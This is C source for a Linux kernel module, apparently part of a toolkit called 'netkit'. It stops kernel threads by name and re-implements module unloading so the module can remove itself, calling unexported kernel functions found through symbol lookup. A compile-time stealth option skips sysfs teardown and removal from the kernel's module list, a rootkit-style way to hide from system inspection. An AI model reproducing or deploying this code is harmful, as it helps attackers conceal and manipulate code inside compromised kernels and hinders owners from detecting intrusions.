#include <linux/types.h>
#include <linux/errno.h>
#include <linux/module.h>
#include <linux/sched/signal.h>
#include <linux/kthread.h>
#include <linux/kernel.h>
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/slab.h>

#include "task.h"

#include "symbol.h"
#include "debug.h"
#include "../netkit.h"

static struct task_struct *get_task_by_name(const char *name)
{
    struct task_struct *task;

    for_each_process(task) {
        if (strcmp(task->comm, name) == 0) {
            return task;
        }
    }

    return NULL;
}

int kthread_stop_by_name(const char *name)
{
    struct task_struct *task;

    task = get_task_by_name(name);
    if (!task)
        return -ESRCH;

    return kthread_stop(task);
}


#define MODULE_REF_BASE	1

// direct copy
static int try_release_module_ref(struct module *mod)
{
	int ret;

	// Try to decrement refcnt which we set at loading
	ret = atomic_sub_return(MODULE_REF_BASE, &mod->refcnt);
	BUG_ON(ret < 0);
	if (ret)
		// Someone can put this right now, recover with checking
		ret = atomic_add_unless(&mod->refcnt, MODULE_REF_BASE, 0);

	return ret;
}

// direct copy from kernel, but it's optimized away so no symbol :(
static int try_stop_module(struct module *mod, int flags, int *forced)
{
	// If it's not unused, quit unless we're forcing.
	if (try_release_module_ref(mod) != 0) {
		*forced = (flags & O_TRUNC);
		if (!(*forced))
			return -EWOULDBLOCK;

		add_taint(TAINT_FORCED_RMMOD, LOCKDEP_NOW_UNRELIABLE);
	}

	// Mark it as dying.
	mod->state = MODULE_STATE_GOING;

	return 0;
}

static void free_module(struct module *mod)
{
    struct mutex *module_mutex;
    void (*module_arch_cleanup)(struct module*);
    void (*module_unload_free)(struct module*);
    void (*mod_tree_remove)(struct module*);
    void (*module_arch_freeing_init)(struct module*);
    void (*destroy_params)(struct kernel_param*, unsigned);
    void (*module_bug_cleanup)(struct module*);
    void (*do_exit)(long);

	// leave out:
	// - trace_module_free (function not found)
	// - mod_sysfs_teardown (function already called)
	// - live patch code (this is not live patch code)
	// - deletion from module list (already called)
	// - try_add_tained_module (a lot of ugly code reuse)
	// **** free_mod_mem(mod) **** (causes bug(), but this will cause memory to keep existing)

#if (!CONFIG_NETKIT_STEALTH)
    void (*mod_sysfs_teardown)(struct module*);

    mod_sysfs_teardown = (void (*)(struct module*))sym_lookup("mod_sysfs_teardown");
	mod_sysfs_teardown(mod);
#endif

    module_mutex = (struct mutex*)sym_lookup("module_mutex");

	// We leave it in list to prevent duplicate loads, but make sure
	// that noone uses it while it's being deconstructed.
	mutex_lock(module_mutex);
	mod->state = MODULE_STATE_UNFORMED;
	mutex_unlock(module_mutex);

	// Arch-specific cleanup.
	module_arch_cleanup = (void (*)(struct module*))sym_lookup("module_arch_cleanup");
	module_arch_cleanup(mod);

	// Module unload stuff
	module_unload_free = (void (*)(struct module*))sym_lookup("module_unload_free");
	module_unload_free(mod);

	// Free any allocated parameters.
	destroy_params = (void (*)(struct kernel_param*, unsigned))sym_lookup("destroy_params");
	destroy_params(mod->kp, mod->num_kp);

	// Now we can delete it from the lists
	mutex_lock(module_mutex);
	// Unlink carefully: kallsyms could be walking list.
	
#if (!CONFIG_NETKIT_STEALTH)
	list_del_rcu(&mod->list);
#endif

	mod_tree_remove = (void (*)(struct module*))sym_lookup("mod_tree_remove");
	mod_tree_remove(mod);

	// Remove this module from bug list, this uses list_del_rcu
	module_bug_cleanup = (void (*)(struct module*))sym_lookup("module_bug_cleanup");
	module_bug_cleanup(mod);
	// Wait for RCU-sched synchronizing before releasing mod->list and buglist.
	synchronize_rcu();
	//if (try_add_tainted_module(mod))
	//	pr_err("%s: adding tainted module to the unloaded tainted modules list failed.\n", mod->name);
	mutex_unlock(module_mutex);

	// This may be empty, but that's OK
	module_arch_freeing_init = (void (*)(struct module*))sym_lookup("module_arch_freeing_init");
	module_arch_freeing_init(mod);
	kfree(mod->args);
	free_percpu(mod->percpu);

	NETKIT_LOG("[*] gonna exit...\n");

	do_exit = (void (*)(long))sym_lookup("do_exit");
	do_exit(0);
}

/*
 * this code is pretty much destroy_module, but recoded to avoid userland mem
 * if there's a workaround to allocate userland mem, please implement
 * 
 * segfaults when successfull
 */
int module_stop(void* data)
{
    struct mutex *module_mutex;
	struct module *mod = (struct module*)data;
	void (*async_synchronize_full)(void);
    int forced;
    int retv = 0;


    module_mutex = (struct mutex*)sym_lookup("module_mutex");
	NETKIT_LOG("[*] module_stop entering mutex lock...\n");
	if (mutex_lock_interruptible(module_mutex) != 0)
	{
        retv = -EINTR;
        goto LAB_OUT;
    }

    if (mod->state != MODULE_STATE_LIVE) {
		NETKIT_LOG("[!] %s already dying\n", mod->name);
		retv = -EBUSY;
		goto LAB_OUT;
	}

	NETKIT_LOG("[*] trying to stop module...\n");
    // just relying on struct mod*
    retv = try_stop_module(mod, 0, &forced);
	if (retv != 0)
		goto LAB_OUT;

	mutex_unlock(module_mutex);

	NETKIT_LOG("[*] exiting module...\n");
	mod->exit();
	
    // don't remove kernel live patches, since every module will be notified

	// sync RCU function calls
	NETKIT_LOG("[*] syncing...\n");
	async_synchronize_full = (void (*)(void))sym_lookup("async_synchronize_full");
	async_synchronize_full();

	// pagefaults, so this does not return
	NETKIT_LOG("[*] freeing...\n");
	//free_module = (void (*)(struct module*))sym_lookup("free_module");
	free_module(mod);

	// implement this in ASM (or C lol):
	// push do_exit
	// jmp free_module

	// this is unreachable, but a safe guard can't hurt
	BUG();
	return 0;

LAB_OUT:
	mutex_unlock(module_mutex);
    return retv;
}